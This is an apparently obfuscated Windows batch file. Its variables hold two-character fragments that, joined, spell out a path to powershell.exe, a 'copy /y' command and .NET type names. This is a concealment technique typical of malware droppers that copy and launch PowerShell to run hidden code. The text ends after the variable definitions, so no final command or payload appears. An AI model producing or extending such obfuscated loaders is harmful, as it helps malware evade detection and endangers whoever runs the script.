@echo off
set "tVVbJNIJvy=y "
set "bhDtdtfrGp=nd"
set "TJsUffiNji=do"
set "tmsNqYaODi=ll"
set "tSMPooUorS=co"
set "LkwaYMmZOT=he"
set "rspMrSvwVa=xe"
set "HaMviZhjqd= C"
set "qcqeqrAVRZ=he"
set "ULAlrGDyxD=we"
set "ttlLbxmiNS=Sy"
set "SCoXSCJzuh=rS"
set "FkSxHvzhTr=ws"
set "MucpauJyjO=rs"
set "mlYJmbRyBH=po"
set "akBfVexenn=st"
set "NBWbDksqsS=in"
set "oibVtjEDQS=em"
set "fCtGIRiJIR=.e"
set "MVbOWMynmQ=32"
set "mRDaClGkpS=s\"
set "KAaUPJaQjv=0\"
set "OwtBgqFNXF=Wi"
set "CzFdakLUvk=1."
set "gIGxjzcoZc= /"
set "gjCxNxpyAL=ll"
set "JEoXjNZYcr=py"
set "GSJTbbpxfy=\W"
set "VKtYyqSAzD=\v"
set "uiVuXWAPOV=we"
set "TgxsflYZlL=Po"
set "gKYonSbxLc=ow"
set "EQCRlgBivb=:\"
set "EwKNbpfoGt=cd"
set "ajhIuepRLv= %~dp0"
set "zFzmwgsDgX= New"
set "iWqjnhyLEr=tryP"
set "VAOzihmTGf=n ''"
set "hzKCSAeDBr=stem"
set "hsLXUjAnfF=[Sys"
set "nFrFXbtJAu=se()"
set "idJbgvWAoR=[Sys"
